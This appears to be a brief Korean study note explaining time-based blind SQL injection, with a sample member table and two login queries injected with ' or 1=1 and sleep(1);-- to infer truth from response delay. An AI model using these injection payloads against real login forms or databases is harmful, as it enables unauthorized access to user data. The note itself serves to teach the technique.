# time based blind sqli

#### time based blind sqli 란
 
> blind sqli 를 시도해도 참인이 거짓인지 반환을 받지 못할때 시간지연 함수로 참과 거짓의 값을 가져온다.

db 예)

```sql
database -> test
tables -> member
column -> id, pw
column data -> (admin , password) (guest, guest)
```


Query 예)

```sql
SELECT * FROM member WHERE id='' or 1=1 and sleep(1);--and pw='';

SELECT * FROM member WHERE id='' and pw='' or 1=1 and sleep(1);--'';

# 1=1 과 sleep(1) 가 참이여야지 작동이 된다.
# 1=1 식 자체는 참이고 sleep(1) 는 실행만 잘 되면 참이기때문에
# 시간지연이 일어나면서 참이라는 값을 얻게 된다.
```


